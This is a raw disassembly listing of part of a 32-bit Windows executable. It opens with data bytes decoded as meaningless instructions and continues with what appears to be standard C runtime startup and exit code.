  4224f3:	les    edi,FWORD PTR [edi]
  4224f5:	push   edx
  4224f6:	cmp    BYTE PTR [ecx-0x22],dl
  4224f9:	in     eax,0xe3
  4224fb:	ffreep st(5)
  4224fd:	add    DWORD PTR [eax],0xffffffcc
  422500:	and    eax,0x7f06603b
  422505:	sub    esp,edx
  422507:	and    eax,0xe7fc5b0
  42250c:	or     al,0x99
  42250e:	icebp  
  42250f:	xlat   BYTE PTR ds:[ebx]
  422510:	mov    dl,0x6d
  422512:	ins    BYTE PTR es:[edi],dx
  422513:	dec    esi
  422514:	mov    eax,ds:0x46e63629
  422519:	cld    
  42251a:	sbb    cl,BYTE PTR [edx]
  42251c:	fdiv   QWORD PTR [edx+0x721bf6bc]
  422522:	(bad)  
  422523:	cmp    DWORD PTR [edx-0x363cce7b],edi
  422529:	mov    al,0x4e
  42252b:	adc    ebx,DWORD PTR [edi]
  42252d:	sbb    al,0x18
  42252f:	and    eax,0xbe4d99e2
  422534:	mov    ah,0x3d
  422536:	out    0xe0,eax
  422538:	call   0xb3e0d4cb
  42253d:	ret    
  42253e:	jne    0x4224f3
  422540:	mov    ecx,0x5ed48588
  422545:	xor    cl,BYTE PTR [ecx+0x383e255d]
  42254b:	lahf   
  42254c:	mov    cl,BYTE PTR [ebx-0x4bda9b92]
  422552:	(bad)  
  422554:	xchg   BYTE PTR [ecx],dh
  422556:	hlt    
  422557:	fist   WORD PTR [esi]
  422559:	cdq    
  42255a:	xchg   esp,eax
  42255b:	xor    eax,0xb9084c7b
  422560:	xor    al,0x6b
  422562:	lock arpl WORD PTR [edx-0x319ee5b2],bp
  422569:	xchg   esp,eax
  42256a:	mov    ebx,eax
  42256c:	adc    cl,al
  42256e:	xchg   BYTE PTR [edi],al
  422570:	add    eax,0xfd3eac26
  422575:	fwait
  422576:	gs push ds
  422578:	das    
  422579:	aas    
  42257a:	and    BYTE PTR [eax],ah
  42257c:	mov    ecx,0xc7e3bb8d
  422581:	push   ss
  422582:	adc    edx,DWORD PTR [edx]
  422584:	cmp    BYTE PTR [ecx+0x15],cl
  422587:	retf   
  422588:	loop   0x42254d
  42258a:	inc    edi
  42258b:	inc    ebp
  42258c:	call   0x5e73:0xb982108e
  422593:	out    dx,al
  422594:	int    0xb
  422596:	add    eax,0xd19c8439
  42259b:	hlt    
  42259c:	pop    esp
  42259d:	mov    BYTE PTR [ecx+0x21],dl
  4225a0:	and    BYTE PTR [eax+0x35a47f3b],0x6
  4225a7:	or     bl,BYTE PTR [esp+edx*1+0x33ab569d]
  4225ae:	cli    
  4225af:	pop    ss
  4225b0:	iret   
  4225b1:	jmp    0x5b7b:0x26f2cb4
  4225b8:	repnz pop ebx
  4225ba:	push   ds
  4225bb:	mov    edi,0x2582daa7
  4225c0:	fadd   DWORD PTR [edi-0x2d]
  4225c3:	dec    ecx
  4225c4:	adc    eax,0x5c742f02
  4225c9:	push   ebp
  4225ca:	out    dx,al
  4225cb:	mov    bh,BYTE PTR [esi]
  4225cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4225ce:	jmp    0x9bd1:0xc50a39fc
  4225d5:	add    eax,0xcb4890f7
  4225da:	mov    edx,?
  4225dc:	xchg   esp,eax
  4225dd:	sub    eax,0x7cd9b57a
  4225e2:	(bad)  
  4225e3:	push   ebp
  4225e4:	int3   
  4225e5:	xchg   edi,eax
  4225e6:	or     edx,DWORD PTR [ebx-0x8]
  4225e9:	scas   eax,DWORD PTR es:[edi]
  4225ea:	mov    dh,0x62
  4225ec:	out    dx,eax
  4225ed:	outs   dx,BYTE PTR ds:[esi]
  4225ee:	add    bh,BYTE PTR [edx+0x3a0bfbd9]
  4225f4:	cli    
  4225f5:	mov    al,ds:0x99cd8950
  4225fa:	xor    ebx,ebx
  4225fc:	stos   DWORD PTR es:[edi],eax
  4225fd:	ffreep st(7)
  4225ff:	add    BYTE PTR [edi],bh
  422601:	pop    edi
  422602:	xor    ebp,ebx
  422604:	in     al,dx
  422605:	dec    ebx
  422606:	es in  eax,dx
  422608:	lahf   
  422609:	add    DWORD PTR [eax],ebp
  42260b:	pop    ss
  42260c:	or     cl,ah
  42260e:	int3   
  42260f:	jp     0x42268a
  422611:	cmp    al,0x47
  422613:	fwait
  422614:	push   ebp
  422615:	xchg   edi,eax
  422616:	cwde   
  422617:	adc    BYTE PTR [ecx-0x473d48e5],dl
  42261d:	pushf  
  42261e:	inc    edi
  42261f:	arpl   dx,bp
  422621:	repz mov esp,0x4167a86b
  422627:	shl    BYTE PTR [esi+eax*4-0x3f81999e],cl
  42262e:	push   edi
  42262f:	jb     0x422686
  422631:	imul   ebp,esi,0x27
  422634:	cmp    al,0xa5
  422636:	idiv   BYTE PTR [ebx+0x3e1fd608]
  42263c:	mov    ecx,0x11b87b53
  422641:	repz dec esi
  422643:	dec    ecx
  422644:	imul   esp,DWORD PTR [esi+eiz*2],0x3196fad0
  42264b:	mov    fs,WORD PTR [esp-0x7c]
  42264f:	bound  ebx,QWORD PTR [esi-0x734516cb]
  422655:	inc    esi
  422656:	ret    0x49b9
  422659:	push   edx
  42265a:	enter  0x2c30,0x77
  42265e:	call   0x7608f350
  422663:	sub    al,0x9d
  422665:	clc    
  422666:	or     al,0xbe
  422668:	add    BYTE PTR [edi-0x8],bl
  42266b:	jb     0x4226d6
  42266d:	data16 jno 0x422611
  422670:	xlat   BYTE PTR ds:[ebx]
  422671:	pop    es
  422672:	out    dx,eax
  422673:	(bad)  
  422674:	mov    ebx,0xf3ec58b7
  422679:	imul   esi,DWORD PTR [ebx],0xeafe79b8
  42267f:	adc    al,0xf9
  422681:	out    dx,al
  422682:	adc    DWORD PTR ds:0x10f2c67c,edi
  422688:	jle    0x42264d
  42268a:	jbe    0x422625
  42268c:	ror    cl,cl
  42268e:	jl     0x422692
  422690:	neg    DWORD PTR [ecx+0x2d]
  422693:	push   ecx
  422694:	and    ch,dh
  422696:	mov    ecx,0x2edd9cb6
  42269b:	retf   
  42269c:	sub    esi,DWORD PTR [edx]
  42269e:	xor    BYTE PTR [esi],dh
  4226a0:	jmp    0x422637
  4226a2:	repz push cs
  4226a4:	dec    esi
  4226a5:	imul   DWORD PTR [eax]
  4226a7:	pop    eax
  4226a8:	es push cs
  4226aa:	lods   al,BYTE PTR ds:[esi]
  4226ab:	mov    al,0x68
  4226ad:	daa    
  4226ae:	jbe    0x422688
  4226b0:	pusha  
  4226b1:	pop    edi
  4226b2:	jmp    0x422655
  4226b4:	call   0xbc05f476
  4226b9:	pusha  
  4226ba:	jns    0x42267f
  4226bc:	adc    ah,bh
  4226be:	retf   0x4277
  4226c1:	es lock or eax,0xe604263b
  4226c8:	jle    0x4226f6
  4226ca:	mov    ecx,0xbe954fad
  4226cf:	sub    al,0xe0
  4226d1:	test   DWORD PTR [esp+ebx*1-0x29],esp
  4226d5:	shl    BYTE PTR [esi+0x1a],cl
  4226d8:	jmp    0x8eae89e9
  4226dd:	cld    
  4226de:	clc    
  4226df:	rol    BYTE PTR [esi+0x3f8f30bd],cl
  4226e5:	scas   eax,DWORD PTR es:[edi]
  4226e6:	imul   ebp,edi,0xfffffff8
  4226e9:	dec    eax
  4226ea:	shl    edx,1
  4226ec:	aaa    
  4226ed:	popa   
  4226ee:	in     eax,dx
  4226ef:	xor    esi,DWORD PTR [ebp-0x2fc42b7a]
  4226f5:	imul   BYTE PTR [ebp-0x1f]
  4226f8:	sti    
  4226f9:	inc    esp
  4226fa:	lods   al,BYTE PTR ds:[esi]
  4226fb:	mov    eax,ds:0xa32b1c12
  422700:	or     BYTE PTR [ebx-0x5bd33478],al
  422706:	xor    al,0xc9
  422708:	dec    ebx
  422709:	hlt    
  42270a:	(bad)  
  42270b:	sub    al,dh
  42270d:	ds adc eax,ecx
  422710:	shl    DWORD PTR [edi+0x35db5730],1
  422716:	adc    bh,BYTE PTR [esi+0x6a]
  422719:	jbe    0x42273e
  42271b:	into   
  42271c:	and    eax,0x358dd60a
  422721:	xchg   ecx,eax
  422722:	cli    
  422723:	inc    eax
  422724:	jbe    0x4226df
  422726:	pop    es
  422727:	fnstenv [ebp+0x26985a9d]
  42272d:	cmp    BYTE PTR [edi+ecx*1],ah
  422730:	bsf    edx,DWORD PTR [ebx-0x1a]
  422734:	push   0x2d974687
  422739:	test   BYTE PTR [edx-0x59adeb51],dl
  42273f:	inc    esi
  422740:	pop    eax
  422741:	push   esi
  422742:	cwde   
  422743:	shl    DWORD PTR [ebx-0x2ef87ce8],0xaa
  42274a:	ja     0x422720
  42274c:	cmp    al,0x90
  42274e:	xchg   DWORD PTR [edx-0x59],eax
  422751:	aas    
  422752:	pop    eax
  422753:	lock and DWORD PTR [esi+edx*8-0xb59e77b],0x429d5450
  42275f:	sub    esp,edx
  422761:	mov    edi,0x1f8fa44d
  422766:	pop    eax
  422767:	ja     0x422745
  422769:	iret   
  42276a:	inc    ebx
  42276b:	neg    BYTE PTR [edx+0x4b96c20d]
  422771:	push   0xffffffec
  422773:	push   esi
  422774:	jecxz  0x42274e
  422776:	retf   
  422777:	or     ah,BYTE PTR [edx-0x73]
  42277a:	sbb    DWORD PTR [ebx],0xb50c7769
  422780:	sahf   
  422781:	or     bh,BYTE PTR [edx]
  422783:	dec    edi
  422784:	or     ebp,DWORD PTR [edi+ebp*1]
  422787:	sub    BYTE PTR [ecx+0x4c],bh
  42278a:	mov    eax,0xc278f6d5
  42278f:	mov    cl,ch
  422791:	sbb    al,0xdf
  422793:	push   0x1e801561
  422798:	mov    esi,0x94ecc603
  42279d:	adc    ah,BYTE PTR [edx+0x42]
  4227a0:	push   esi
  4227a1:	jmp    0x52330345
  4227a6:	test   BYTE PTR [edi],0x11
  4227a9:	xchg   DWORD PTR [ebx],ebp
  4227ab:	leave  
  4227ac:	loop   0x422816
  4227ae:	and    BYTE PTR [esi+0x21d6a31f],bl
  4227b4:	fisttp DWORD PTR [eax-0x5dedc4fe]
  4227ba:	(bad)  
  4227bb:	pusha  
  4227bc:	das    
  4227bd:	pusha  
  4227be:	adc    al,0x55
  4227c0:	adc    ecx,DWORD PTR [ecx-0x6c]
  4227c3:	dec    eax
  4227c4:	inc    edx
  4227c5:	xchg   DWORD PTR [esi+edx*8],edx
  4227c8:	sub    eax,0x99197b45
  4227cd:	and    DWORD PTR [eax+ecx*4-0x17bed6b8],0x6c
  4227d5:	push   es
  4227d6:	pop    edi
  4227d7:	fst    QWORD PTR [ebx+edx*8-0x26]
  4227db:	into   
  4227dc:	mov    cl,0xa3
  4227de:	inc    esp
  4227df:	mov    ch,0xf8
  4227e1:	jns    0x422822
  4227e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4227e4:	mov    esi,ebx
  4227e6:	adc    eax,0xdde8fc3f
  4227eb:	xchg   ebx,eax
  4227ec:	sti    
  4227ed:	jge    0x422831
  4227ef:	daa    
  4227f0:	outs   dx,DWORD PTR ds:[esi]
  4227f1:	les    eax,FWORD PTR [edx+0x628c5a03]
  4227f7:	mov    bh,BYTE PTR [edx-0x3e]
  4227fa:	sbb    eax,0xc86a1449
  4227ff:	mov    al,0x8c
  422801:	cmp    BYTE PTR [ecx-0x52],dh
  422804:	jg     0x4227c3
  422806:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422807:	xor    dl,dl
  422809:	inc    esp
  42280a:	or     DWORD PTR [ebp-0x3d8096e5],ebp
  422810:	push   0xc34ef0a9
  422815:	ins    BYTE PTR es:[edi],dx
  422816:	jg     0x4227ee
  422818:	fcom   DWORD PTR [ecx+0x7b]
  42281b:	xor    al,0xc8
  42281d:	stc    
  42281e:	add    DWORD PTR [ebx-0x70],0xffffffdb
  422822:	data16 stos BYTE PTR es:[edi],al
  422824:	test   DWORD PTR [esi+0x55e22918],esp
  42282a:	pop    ebx
  42282b:	cmp    cl,BYTE PTR [edi-0x19]
  42282e:	jmp    0x6ea3:0x64e4f09e
  422835:	add    DWORD PTR [eax-0x3c1cd651],edi
  42283b:	fwait
  42283c:	sbb    cl,BYTE PTR [edi]
  42283e:	jno    0x422863
  422840:	je     0x422839
  422842:	xchg   esp,eax
  422843:	adc    eax,ebp
  422845:	add    esi,DWORD PTR [ebp+0x765e6fc2]
  42284b:	call   0x2251:0xe0e649d1
  422852:	lds    ebx,FWORD PTR [ecx-0x529baae]
  422858:	dec    edx
  422859:	cmp    BYTE PTR [ebx-0x2ffffd6f],bl
  42285f:	push   ss
  422860:	mov    dl,0x59
  422862:	push   0xffffffdf
  422864:	retf   
  422865:	ret    0x1ed0
  422868:	inc    ebp
  422869:	mov    ah,0xb
  42286b:	out    dx,eax
  42286c:	(bad)  
  42286d:	mov    ecx,0x8d84057
  422872:	mov    ss,WORD PTR [esi]
  422874:	mov    DWORD PTR [ecx],esp
  422876:	xchg   ebx,eax
  422877:	mov    ds:0xd112bd95,eax
  42287c:	jg     0x42281e
  42287e:	and    DWORD PTR [esi],eax
  422880:	cmp    BYTE PTR [ebx-0x23],bh
  422883:	xor    ecx,esp
  422885:	cmc    
  422886:	xor    ah,dl
  422888:	xor    bl,BYTE PTR [ebp+0x3]
  42288b:	ret    0xeab1
  42288e:	fimul  DWORD PTR [esi+0x51a901a3]
  422894:	adc    DWORD PTR [ecx+0x3d65d1eb],eax
  42289a:	or     al,0xeb
  42289c:	fs in  eax,0xd7
  42289f:	clc    
  4228a0:	cmp    edi,esi
  4228a2:	push   ss
  4228a3:	jbe    0x4228c6
  4228a5:	pop    ebp
  4228a6:	fnstcw WORD PTR [ebx]
  4228a8:	pop    esp
  4228a9:	div    DWORD PTR [eax]
  4228ab:	sub    eax,0x687313c7
  4228b0:	sbb    ch,BYTE PTR [esi]
  4228b2:	cmp    eax,ebp
  4228b4:	loope  0x422907
  4228b6:	ja     0x4228e0
  4228b8:	cmp    edx,DWORD PTR [ebx+0x5558de22]
  4228be:	push   es
  4228bf:	lea    edi,[esi+0xb77e303]
  4228c5:	cmp    al,0x3b
  4228c7:	jmp    0x4228f9
  4228c9:	arpl   WORD PTR [eax-0x59],cx
  4228cc:	add    DWORD PTR [edi],edi
  4228ce:	pushf  
  4228cf:	or     DWORD PTR [eax-0x1b505a09],ebx
  4228d5:	into   
  4228d6:	push   0xbac57925
  4228db:	dec    eax
  4228dc:	imul   edi,edx,0xffffff88
  4228df:	aas    
  4228e0:	sub    ebp,ecx
  4228e2:	iret   
  4228e3:	(bad)  
  4228e4:	pop    edx
  4228e5:	mov    ecx,0xb4847485
  4228ea:	sub    BYTE PTR [ebx-0x52e7587d],al
  4228f0:	xchg   edx,eax
  4228f1:	push   ebx
  4228f2:	push   esi
  4228f3:	sub    al,0x7c
  4228f5:	or     BYTE PTR [ebp-0x42236fbc],ah
  4228fb:	pushf  
  4228fc:	loopne 0x422907
  4228fe:	icebp  
  4228ff:	jo     0x42293b
  422901:	mov    al,ds:0xad15565b
  422906:	imul   esi,DWORD PTR [edi],0x715ac1cb
  42290c:	mov    ah,0x55
  42290e:	push   esp
  42290f:	stos   DWORD PTR es:[edi],eax
  422910:	or     esp,0x8ea4b932
  422916:	mov    ecx,0x4431ffda
  42291b:	pop    ss
  42291c:	and    ecx,DWORD PTR [eax-0x50]
  42291f:	xor    al,0xaa
  422921:	out    0xef,eax
  422923:	out    dx,al
  422924:	dec    ebp
  422925:	or     DWORD PTR [edi-0x70],0xffffffd7
  422929:	ret    0xbe23
  42292c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42292d:	mov    edx,0xa8c0b93f
  422932:	shr    bl,0xcb
  422935:	les    ebx,FWORD PTR [ecx+0x2e]
  422938:	mov    bl,0x87
  42293a:	fwait
  42293b:	sbb    ch,BYTE PTR [ebp-0x3f1a6f63]
  422941:	rcl    BYTE PTR [ecx+eax*8],cl
  422944:	cs sub al,dl
  422947:	dec    DWORD PTR [edi-0x53ce2436]
  42294d:	add    al,0x83
  42294f:	seta   ch
  422952:	lods   al,BYTE PTR ds:[esi]
  422953:	outs   dx,DWORD PTR ds:[esi]
  422954:	sub    BYTE PTR [edx+0x77a050aa],cl
  42295a:	xor    eax,eax
  42295c:	add    esp,0x10
  42295f:	ret    0x10
  422962:	nop
  422963:	nop
  422964:	nop
  422965:	nop
  422966:	nop
  422967:	nop
  422968:	nop
  422969:	nop
  42296a:	nop
  42296b:	nop
  42296c:	nop
  42296d:	nop
  42296e:	nop
  42296f:	nop
  422970:	cmp    DWORD PTR ds:0x45cabc,0x1
  422977:	jne    0x42297e
  422979:	call   0x422ebc
  42297e:	push   DWORD PTR [esp+0x4]
  422982:	call   0x422d45
  422987:	push   0xff
  42298c:	call   DWORD PTR ds:0x45c1c0
  422992:	pop    ecx
  422993:	pop    ecx
  422994:	ret    
  422995:	cmp    DWORD PTR ds:0x45cabc,0x1
  42299c:	jne    0x4229a3
  42299e:	call   0x422ebc
  4229a3:	push   DWORD PTR [esp+0x4]
  4229a7:	call   0x422d45
  4229ac:	push   0xff
  4229b1:	call   0x422b8b
  4229b6:	pop    ecx
  4229b7:	pop    ecx
  4229b8:	ret    
  4229b9:	push   0x60
  4229bb:	push   0x428118
  4229c0:	call   0x4238a8
  4229c5:	mov    edi,0x94
  4229ca:	mov    eax,edi
  4229cc:	call   0x423900
  4229d1:	mov    DWORD PTR [ebp-0x18],esp
  4229d4:	mov    esi,esp
  4229d6:	mov    DWORD PTR [esi],edi
  4229d8:	push   esi
  4229d9:	call   DWORD PTR ds:0x428028
  4229df:	mov    ecx,DWORD PTR [esi+0x10]
  4229e2:	mov    DWORD PTR ds:0x45cac4,ecx
  4229e8:	mov    eax,DWORD PTR [esi+0x4]
  4229eb:	mov    ds:0x45cad0,eax
  4229f0:	mov    edx,DWORD PTR [esi+0x8]
  4229f3:	mov    DWORD PTR ds:0x45cad4,edx
  4229f9:	mov    esi,DWORD PTR [esi+0xc]
  4229fc:	and    esi,0x7fff
  422a02:	mov    DWORD PTR ds:0x45cac8,esi
  422a08:	cmp    ecx,0x2
  422a0b:	je     0x422a19
  422a0d:	or     esi,0x8000
  422a13:	mov    DWORD PTR ds:0x45cac8,esi
  422a19:	shl    eax,0x8
  422a1c:	add    eax,edx
  422a1e:	mov    ds:0x45cacc,eax
  422a23:	xor    esi,esi
  422a25:	push   esi
  422a26:	mov    edi,DWORD PTR ds:0x428018
  422a2c:	call   edi
  422a2e:	cmp    WORD PTR [eax],0x5a4d
  422a33:	jne    0x422a54
  422a35:	mov    ecx,DWORD PTR [eax+0x3c]
  422a38:	add    ecx,eax
  422a3a:	cmp    DWORD PTR [ecx],0x4550
  422a40:	jne    0x422a54
  422a42:	movzx  eax,WORD PTR [ecx+0x18]
  422a46:	cmp    eax,0x10b
  422a4b:	je     0x422a6c
  422a4d:	cmp    eax,0x20b
  422a52:	je     0x422a59
  422a54:	mov    DWORD PTR [ebp-0x1c],esi
  422a57:	jmp    0x422a80
  422a59:	cmp    DWORD PTR [ecx+0x84],0xe
  422a60:	jbe    0x422a54
  422a62:	xor    eax,eax
  422a64:	cmp    DWORD PTR [ecx+0xf8],esi
  422a6a:	jmp    0x422a7a
  422a6c:	cmp    DWORD PTR [ecx+0x74],0xe
  422a70:	jbe    0x422a54
  422a72:	xor    eax,eax
  422a74:	cmp    DWORD PTR [ecx+0xe8],esi
  422a7a:	setne  al
  422a7d:	mov    DWORD PTR [ebp-0x1c],eax
  422a80:	push   0x1
  422a82:	call   0x423857
  422a87:	pop    ecx
  422a88:	test   eax,eax
  422a8a:	jne    0x422a94
  422a8c:	push   0x1c
  422a8e:	call   0x422995
  422a93:	pop    ecx
  422a94:	call   0x4237ce
  422a99:	test   eax,eax
  422a9b:	jne    0x422aa5
  422a9d:	push   0x10
  422a9f:	call   0x422995
  422aa4:	pop    ecx
  422aa5:	call   0x4236b7
  422aaa:	mov    DWORD PTR [ebp-0x4],esi
  422aad:	call   0x4234b9
  422ab2:	test   eax,eax
  422ab4:	jge    0x422abe
  422ab6:	push   0x1b
  422ab8:	call   0x422970
  422abd:	pop    ecx
  422abe:	call   DWORD PTR ds:0x428024
  422ac4:	mov    ds:0x45d274,eax
  422ac9:	call   0x423397
  422ace:	mov    ds:0x45cab4,eax
  422ad3:	call   0x4232f5
  422ad8:	test   eax,eax
  422ada:	jge    0x422ae4
  422adc:	push   0x8
  422ade:	call   0x422970
  422ae3:	pop    ecx
  422ae4:	call   0x4230c2
  422ae9:	test   eax,eax
  422aeb:	jge    0x422af5
  422aed:	push   0x9
  422aef:	call   0x422970
  422af4:	pop    ecx
  422af5:	call   0x422bcd
  422afa:	mov    DWORD PTR [ebp-0x20],eax
  422afd:	cmp    eax,esi
  422aff:	je     0x422b08
  422b01:	push   eax
  422b02:	call   0x422970
  422b07:	pop    ecx
  422b08:	mov    DWORD PTR [ebp-0x38],esi
  422b0b:	lea    eax,[ebp-0x64]
  422b0e:	push   eax
  422b0f:	call   DWORD PTR ds:0x428020
  422b15:	call   0x423059
  422b1a:	mov    DWORD PTR [ebp-0x68],eax
  422b1d:	test   BYTE PTR [ebp-0x38],0x1
  422b21:	je     0x422b29
  422b23:	movzx  eax,WORD PTR [ebp-0x34]
  422b27:	jmp    0x422b2c
  422b29:	push   0xa
  422b2b:	pop    eax
  422b2c:	push   eax
  422b2d:	push   DWORD PTR [ebp-0x68]
  422b30:	push   esi
  422b31:	push   esi
  422b32:	call   edi
  422b34:	push   eax
  422b35:	call   0x421800
  422b3a:	mov    edi,eax
  422b3c:	mov    DWORD PTR [ebp-0x6c],edi
  422b3f:	cmp    DWORD PTR [ebp-0x1c],esi
  422b42:	jne    0x422b4a
  422b44:	push   edi
  422b45:	call   0x422d05
  422b4a:	call   0x422d27
  422b4f:	jmp    0x422b7c
  422b51:	mov    eax,DWORD PTR [ebp-0x14]
  422b54:	mov    ecx,DWORD PTR [eax]
  422b56:	mov    ecx,DWORD PTR [ecx]
  422b58:	mov    DWORD PTR [ebp-0x70],ecx
  422b5b:	push   eax
  422b5c:	push   ecx
  422b5d:	call   0x422ef5
  422b62:	pop    ecx
  422b63:	pop    ecx
  422b64:	ret    
  422b65:	mov    esp,DWORD PTR [ebp-0x18]
  422b68:	mov    edi,DWORD PTR [ebp-0x70]
  422b6b:	cmp    DWORD PTR [ebp-0x1c],0x0
  422b6f:	jne    0x422b77
  422b71:	push   edi
  422b72:	call   0x422d16
  422b77:	call   0x422d36
  422b7c:	or     DWORD PTR [ebp-0x4],0xffffffff
  422b80:	mov    eax,edi
  422b82:	lea    esp,[ebp-0x7c]
  422b85:	call   0x4238e3
  422b8a:	ret    
  422b8b:	push   0x428134
  422b90:	call   DWORD PTR ds:0x428018
  422b96:	test   eax,eax
  422b98:	je     0x422bb0
  422b9a:	push   0x428124
  422b9f:	push   eax
  422ba0:	call   DWORD PTR ds:0x42801c
  422ba6:	test   eax,eax
  422ba8:	je     0x422bb0
  422baa:	push   DWORD PTR [esp+0x4]
  422bae:	call   eax
  422bb0:	push   DWORD PTR [esp+0x4]
  422bb4:	call   DWORD PTR ds:0x42802c
  422bba:	int3   
  422bbb:	push   0x8
  422bbd:	call   0x423a6f
  422bc2:	pop    ecx
  422bc3:	ret    
  422bc4:	push   0x8
  422bc6:	call   0x4239db
  422bcb:	pop    ecx
  422bcc:	ret    
  422bcd:	mov    eax,ds:0x45d270
  422bd2:	test   eax,eax
  422bd4:	je     0x422bd8
  422bd6:	call   eax
  422bd8:	push   esi
  422bd9:	push   edi
  422bda:	mov    ecx,0x42a00c
  422bdf:	mov    edi,0x42a018
  422be4:	xor    eax,eax
  422be6:	cmp    ecx,edi
  422be8:	mov    esi,ecx
  422bea:	jae    0x422c03
  422bec:	test   eax,eax
  422bee:	jne    0x422c2f
  422bf0:	mov    ecx,DWORD PTR [esi]
  422bf2:	test   ecx,ecx
  422bf4:	je     0x422bf8
  422bf6:	call   ecx
  422bf8:	add    esi,0x4
  422bfb:	cmp    esi,edi
  422bfd:	jb     0x422bec
  422bff:	test   eax,eax
  422c01:	jne    0x422c2f
  422c03:	push   0x4236fb
  422c08:	call   0x423b80
  422c0d:	mov    esi,0x42a000
  422c12:	mov    eax,esi
  422c14:	mov    edi,0x42a008
  422c19:	cmp    eax,edi
  422c1b:	pop    ecx
  422c1c:	jae    0x422c2d
  422c1e:	mov    eax,DWORD PTR [esi]
  422c20:	test   eax,eax
  422c22:	je     0x422c26
  422c24:	call   eax
  422c26:	add    esi,0x4
  422c29:	cmp    esi,edi
  422c2b:	jb     0x422c1e
  422c2d:	xor    eax,eax
  422c2f:	pop    edi
  422c30:	pop    esi
  422c31:	ret    
  422c32:	push   ebp
  422c33:	mov    ebp,esp
  422c35:	push   esi
  422c36:	push   edi
  422c37:	push   0x8
  422c39:	call   0x423a6f
  422c3e:	xor    esi,esi
  422c40:	inc    esi
  422c41:	cmp    DWORD PTR ds:0x45cb04,esi
  422c47:	pop    ecx
  422c48:	jne    0x422c5a
  422c4a:	push   DWORD PTR [ebp+0x8]
  422c4d:	call   DWORD PTR ds:0x428034
  422c53:	push   eax
  422c54:	call   DWORD PTR ds:0x428030
  422c5a:	cmp    DWORD PTR [ebp+0xc],0x0
  422c5e:	mov    al,BYTE PTR [ebp+0x10]
  422c61:	mov    DWORD PTR ds:0x45cb00,esi
  422c67:	mov    ds:0x45cafc,al
  422c6c:	jne    0x422cc0
  422c6e:	mov    ecx,DWORD PTR ds:0x45d268
  422c74:	test   ecx,ecx
  422c76:	je     0x422ca1
  422c78:	mov    eax,ds:0x45d264
  422c7d:	sub    eax,0x4
  422c80:	cmp    eax,ecx
  422c82:	jmp    0x422c9a
  422c84:	mov    eax,DWORD PTR [eax]
  422c86:	test   eax,eax
  422c88:	je     0x422c8c
  422c8a:	call   eax
  422c8c:	mov    eax,ds:0x45d264
  422c91:	sub    eax,0x4
  422c94:	cmp    eax,DWORD PTR ds:0x45d268
  422c9a:	mov    ds:0x45d264,eax
  422c9f:	jae    0x422c84
  422ca1:	mov    eax,0x42a01c
  422ca6:	mov    esi,0x42a020
  422cab:	cmp    eax,esi
  422cad:	mov    edi,eax
  422caf:	jae    0x422cc0
  422cb1:	mov    eax,DWORD PTR [edi]
  422cb3:	test   eax,eax
  422cb5:	je     0x422cb9
  422cb7:	call   eax
  422cb9:	add    edi,0x4
  422cbc:	cmp    edi,esi
  422cbe:	jb     0x422cb1
  422cc0:	mov    eax,0x42a024
  422cc5:	mov    esi,0x42a028
  422cca:	cmp    eax,esi
  422ccc:	mov    edi,eax
  422cce:	jae    0x422cdf
  422cd0:	mov    eax,DWORD PTR [edi]
  422cd2:	test   eax,eax
  422cd4:	je     0x422cd8
  422cd6:	call   eax
  422cd8:	add    edi,0x4
  422cdb:	cmp    edi,esi
  422cdd:	jb     0x422cd0
  422cdf:	cmp    DWORD PTR [ebp+0x10],0x0
  422ce3:	pop    edi
  422ce4:	pop    esi
  422ce5:	je     0x422cf0
  422ce7:	push   0x8
  422ce9:	call   0x4239db
  422cee:	jmp    0x422d02
  422cf0:	push   DWORD PTR [ebp+0x8]
  422cf3:	mov    DWORD PTR ds:0x45cb04,0x1
  422cfd:	call   0x422b8b
  422d02:	pop    ecx
  422d03:	pop    ebp
  422d04:	ret    
  422d05:	push   0x0
  422d07:	push   0x0
  422d09:	push   DWORD PTR [esp+0xc]
  422d0d:	call   0x422c32
  422d12:	add    esp,0xc
  422d15:	ret    
  422d16:	push   0x0
  422d18:	push   0x1
  422d1a:	push   DWORD PTR [esp+0xc]
  422d1e:	call   0x422c32
  422d23:	add    esp,0xc
  422d26:	ret    
  422d27:	push   0x1
  422d29:	push   0x0
  422d2b:	push   0x0
  422d2d:	call   0x422c32
  422d32:	add    esp,0xc
  422d35:	ret    
  422d36:	push   0x1
  422d38:	push   0x1
  422d3a:	push   0x0
  422d3c:	call   0x422c32
  422d41:	add    esp,0xc
  422d44:	ret    
  422d45:	push   ebp
  422d46:	mov    ebp,esp
  422d48:	sub    esp,0x10c
  422d4e:	mov    eax,ds:0x45c430
  422d53:	xor    eax,DWORD PTR [ebp+0x4]
  422d56:	mov    ecx,DWORD PTR [ebp+0x8]
  422d59:	push   ebx
  422d5a:	push   esi
  422d5b:	mov    DWORD PTR [ebp-0x4],eax
  422d5e:	xor    edx,edx
  422d60:	push   edi
  422d61:	xor    eax,eax
  422d63:	cmp    ecx,DWORD PTR [eax*8+0x45c1c8]
  422d6a:	je     0x422d72
  422d6c:	inc    eax
  422d6d:	cmp    eax,0x12
  422d70:	jb     0x422d63
  422d72:	mov    esi,eax
  422d74:	shl    esi,0x3
  422d77:	cmp    ecx,DWORD PTR [esi+0x45c1c8]
  422d7d:	jne    0x422ea6
  422d83:	mov    eax,ds:0x45cabc
  422d88:	cmp    eax,0x1
  422d8b:	je     0x422e81
  422d91:	cmp    eax,edx
  422d93:	jne    0x422da2
  422d95:	cmp    DWORD PTR ds:0x45c1c4,0x1
  422d9c:	je     0x422e81
  422da2:	cmp    ecx,0xfc
  422da8:	je     0x422ea6
  422dae:	push   0x104
  422db3:	lea    eax,[ebp-0x10c]
  422db9:	push   eax
  422dba:	push   edx
  422dbb:	mov    BYTE PTR [ebp-0x8],dl
  422dbe:	call   DWORD PTR ds:0x428040
  422dc4:	test   eax,eax
  422dc6:	jne    0x422ddb
  422dc8:	lea    eax,[ebp-0x10c]
  422dce:	push   0x42848c
  422dd3:	push   eax
  422dd4:	call   0x423c90
  422dd9:	pop    ecx
  422dda:	pop    ecx
  422ddb:	lea    eax,[ebp-0x10c]
  422de1:	push   eax
  422de2:	lea    edi,[ebp-0x10c]
  422de8:	call   0x423ec0
  422ded:	inc    eax
  422dee:	cmp    eax,0x3c
  422df1:	pop    ecx
  422df2:	jbe    0x422e1d
  422df4:	lea    eax,[ebp-0x10c]
  422dfa:	push   eax
  422dfb:	call   0x423ec0
  422e00:	mov    edi,eax
